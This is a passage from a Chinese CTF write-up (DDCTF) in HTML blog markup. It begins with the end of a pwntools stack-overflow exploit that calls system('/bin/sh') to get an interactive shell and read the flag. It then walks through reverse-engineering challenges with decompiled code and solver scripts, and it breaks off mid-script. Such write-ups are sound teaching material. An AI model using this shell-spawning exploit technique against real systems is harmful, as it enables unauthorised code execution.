class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"comment\"># binsh = next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"password: \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"-1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"): \"</span>)</span><br><span class=\"line\">main = <span class=\"number\">0x804862d</span></span><br><span class=\"line\">payload = p32(system)</span><br><span class=\"line\">payload += p32(main)</span><br><span class=\"line\"><span class=\"comment\"># payload += p32(binsh)</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">12</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x4c</span> - <span class=\"number\">0x8</span> , <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">payload += p32(stack_addr - <span class=\"number\">0x4c</span> + <span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">All done, bye!</span><br><span class=\"line\">$ cat flag</span><br><span class=\"line\">DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"RE1\"><a href=\"#RE1\" class=\"headerlink\" title=\"RE1\"></a>RE1</h2><p>本题相当简单，是RE的签到题，就是一个字符匹配，写脚本迭代即可。直接upx脱壳。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"string\">\"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;%$#\\\"!\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">\"DDCTF&#123;reverseME&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = <span class=\"number\">0x402ff8</span></span><br><span class=\"line\">first_addr = <span class=\"number\">0x403018</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> target:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(magic)):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> magic[i] == ch:</span><br><span class=\"line\">\t\t\tflag += chr(i + first_addr - base_addr)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<p>DDCTF{ZZ[JX#,9(9,+9QY!}</p>\n<h2 id=\"RE2\"><a href=\"#RE2\" class=\"headerlink\" title=\"RE2\"></a>RE2</h2><p>本题也不算难，只是需要比上题多一点的逆向功底，可以说上题只靠调试器就能解决了。该题首先将16进制字符串解码，然后base64编码，令编码后的结果为”reserse+”即可。这里在二进制文件中并没有base64的那个明显的字符串，但是有一个64位的字符串很可疑，最后调试发现其实就是标准的base64算法。</p>\n<p>对了，本题也加了壳，但是我记得似乎不能用upx直接脱壳，用esp定律即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target = <span class=\"string\">\"reverse+\"</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">print</span> b64decode(target).encode(<span class=\"string\">\"hex\"</span>).upper()</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{ADEBDEAEC7BE}</p>\n<h2 id=\"Confused\"><a href=\"#Confused\" class=\"headerlink\" title=\"Confused\"></a>Confused</h2><p>本题是一道macos逆向题，这是我第一次做macOS的逆向，但其实逆向的思路都是一样的。右键点击app（当然要在osx系统下）文件，选择显示包内容，然后在/Contents/MacOS/路径下就能找到可执行文件。其实我们可以直接用IDA打开这个文件进行反汇编，然后用llgb（类似gdb）加载这个文件进行动态调试。</p>\n<p>简单看一下，发现核心逻辑就在checkCode函数中。</p>\n<p>函数首先检查flag是否以”DDCTF{“开头，然后检查最后一位是否为”}”，然后用substringWithRange函数获取花括号包裹的字符串，如果它的长度为18，则合法，且转为UTF8String。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v5; <span class=\"comment\">// ST18_8</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v6; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v9; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v11; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v12; <span class=\"comment\">// [rsp+38h] [rbp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v13; <span class=\"comment\">// [rsp+40h] [rbp-50h]</span></span><br><span class=\"line\">  __int128 v14; <span class=\"comment\">// [rsp+48h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v15; <span class=\"comment\">// [rsp+58h] [rbp-38h]</span></span><br><span class=\"line\">  SEL v16; <span class=\"comment\">// [rsp+60h] [rbp-30h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v17; <span class=\"comment\">// [rsp+68h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v18; <span class=\"comment\">// [rsp+70h] [rbp-20h]</span></span><br><span class=\"line\">  __int64 v19; <span class=\"comment\">// [rsp+78h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+80h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v21; <span class=\"comment\">// [rsp+88h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v17 = self;</span><br><span class=\"line\">  v16 = a2;</span><br><span class=\"line\">  v15 = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, (__int64)a3);</span><br><span class=\"line\">  v3 = objc_msgSend(v17, <span class=\"string\">\"pwd\"</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v3);</span><br><span class=\"line\">  v5 = v4;</span><br><span class=\"line\">  v6 = objc_msgSend(v4, <span class=\"string\">\"stringValue\"</span>);</span><br><span class=\"line\">  v14 = (<span class=\"keyword\">unsigned</span> __int64)objc_retainAutoreleasedReturnValue((__int64)v6);</span><br><span class=\"line\">  objc_release(v5);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"hasPrefix:\"</span>, CFSTR(<span class=\"string\">\"DDCTF&#123;\"</span>)) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v7 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">    v8 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringFromIndex:\"</span>, v7 - <span class=\"number\">1</span>);</span><br><span class=\"line\">    v13 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v8);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int8)objc_msgSend(v13, <span class=\"string\">\"isEqualToString:\"</span>, CFSTR(<span class=\"string\">\"&#125;\"</span>)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v9 = (<span class=\"keyword\">char</span> *)objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"length\"</span>);</span><br><span class=\"line\">      v19 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v18 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v20 = <span class=\"number\">6L</span>L;</span><br><span class=\"line\">      v21 = v9 - <span class=\"number\">7</span>;</span><br><span class=\"line\">      v10 = objc_msgSend((<span class=\"keyword\">void</span> *)v14, <span class=\"string\">\"substringWithRange:\"</span>, <span class=\"number\">6L</span>L, v9 - <span class=\"number\">7</span>);</span><br><span class=\"line\">      v12 = (<span class=\"keyword\">void</span> *)objc_retainAutoreleasedReturnValue((__int64)v10);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( objc_msgSend(v12, <span class=\"string\">\"length\"</span>) == (<span class=\"keyword\">void</span> *)<span class=\"number\">18</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v11 = (<span class=\"keyword\">void</span> *)objc_retainAutorelease(v12);</span><br><span class=\"line\">        *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) = objc_msgSend(v11, <span class=\"string\">\"UTF8String\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      objc_storeStrong((__int64)&amp;v12, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    objc_storeStrong((__int64)&amp;v13, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;v14 + <span class=\"number\">1</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)sub_1000011D0(*((__int64 *)&amp;v14 + <span class=\"number\">1</span>)) == <span class=\"number\">1</span> )</span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onSuccess\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    objc_msgSend(v17, <span class=\"string\">\"onFailed\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v14, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  objc_storeStrong((__int64)&amp;v15, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在sub_100001f60中，对一个结构体进行了初始化，填充了一些常量和函数指针，这个结构体是该题的核心。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F60</span><span class=\"params\">(__int64 result, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_DWORD *)result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">4</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">8</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">16</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">176</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">32</span>) = <span class=\"number\">-16</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">40</span>) = sub_100001D70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">48</span>) = <span class=\"number\">-15</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">56</span>) = sub_100001A60;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">64</span>) = <span class=\"number\">-14</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">72</span>) = sub_100001AA0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">80</span>) = <span class=\"number\">-12</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">88</span>) = sub_100001CB0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">96</span>) = <span class=\"number\">-11</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">104</span>) = sub_100001CF0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">112</span>) = <span class=\"number\">-13</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">120</span>) = sub_100001B70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">128</span>) = <span class=\"number\">-10</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">136</span>) = sub_100001B10;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">144</span>) = <span class=\"number\">-9</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">152</span>) = sub_100001D30;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">160</span>) = <span class=\"number\">-8</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">168</span>) = sub_100001C60;</span><br><span class=\"line\">  qword_100003F58 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x400</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __memcpy_chk((<span class=\"keyword\">char</span> *)qword_100003F58 + <span class=\"number\">48</span>, a2, <span class=\"number\">18L</span>L, <span class=\"number\">-1L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由上述，逆向得到结构体中的关键变量如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  DWORD num0; <span class=\"comment\">// + 0</span></span><br><span class=\"line\">  DWORD num4; <span class=\"comment\">// + 4</span></span><br><span class=\"line\">  DWORD num8; <span class=\"comment\">// + 8</span></span><br><span class=\"line\">  DWORD num12; <span class=\"comment\">// + 12</span></span><br><span class=\"line\">  DWORD flag; <span class=\"comment\">// + 16</span></span><br><span class=\"line\">  DWORD result; <span class=\"comment\">// + 176</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>结构体中其他字段为常数和常量函数指针，后续算法中这些常数和函数指针是一一对应的。常数分别为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array = [<span class=\"number\">0xf0</span>, <span class=\"number\">0xf1</span>, <span class=\"number\">0xf2</span>, <span class=\"number\">0xf4</span>, <span class=\"number\">0xf5</span>, <span class=\"number\">0xf3</span>, <span class=\"number\">0xf6</span>, <span class=\"number\">0xf7</span>, <span class=\"number\">0xf8</span>]</span><br></pre></td></tr></table></figure>\n<p>最后在0x100001f00中，首先令结构体的0x24偏移处指向一块内存区域，然后循环调用sub_100001e50。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F00</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_QWORD *)(myclass + <span class=\"number\">24</span>) = (<span class=\"keyword\">char</span> *)&amp;loc_100001980 + <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) != <span class=\"number\">243</span> )</span><br><span class=\"line\">    sub_100001E50(myclass);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(qword_100003F58);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(myclass + <span class=\"number\">176</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>sub_100001e50的f5代码如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> __<span class=\"function\">fastcall <span class=\"title\">sub_100001E50</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">bool</span> result; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"keyword\">bool</span> v2; <span class=\"comment\">// [rsp+Fh] [rbp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">      v2 = v3 &lt; <span class=\"number\">9</span>;</span><br><span class=\"line\">    result = v2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) == *(<span class=\"keyword\">unsigned</span> __int8 *)(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">      (*(<span class=\"keyword\">void</span> (__fastcall **)(__int64))(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span> + <span class=\"number\">8</span>))(myclass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果那块内存区域中当前指针指向的位置的标志与相应的常数相同，就执行相应的函数指针的所指向的函数操作。</p>\n<p>最后是需要result字段为1，而result字段为1需要调用sub_10001d30函数。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001D30</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(*(_QWORD *)(a1 + <span class=\"number\">24</span>) + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">176</span>) = result;</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">24</span>) += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看起来似乎十分复杂，但我们仔细观察一下那块内存区域。</p>\n<p>可以看到\\xf0, \\xf8, \\xf2, \\xf6这些标志位重复的出现，而在0xc6和0xcc偏移处出两次出现\\xf7，由上述sub_10001d30函数的F5代码看出，在若结构体中的指针指向0xc6处，将会把结构体中的result字段设置为1（因为紧接着\\xf7的一个byte为\\x01）。这时我们悟到，程序中会多次执行\\xf0, \\xf8, \\xf2, \\xf6对应的函数指针的函数操作，直到结构体中0x24处的指针走到0xc6偏移处。此时我们只需要对这四个函数进行逆向即可，下面给出这4个函数算法的Python实现。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func0</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum0 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x11</span>:</span><br><span class=\"line\">\t\tnum4 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x12</span>:</span><br><span class=\"line\">\t\tnum8 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x13</span>:</span><br><span class=\"line\">\t\tnum12 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x14</span>:</span><br><span class=\"line\">\t\tnum0 = input_str[cur]</span><br><span class=\"line\">\tindex += <span class=\"number\">6</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 == input_str[cur]:\t</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func6</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tindex += magic[index + <span 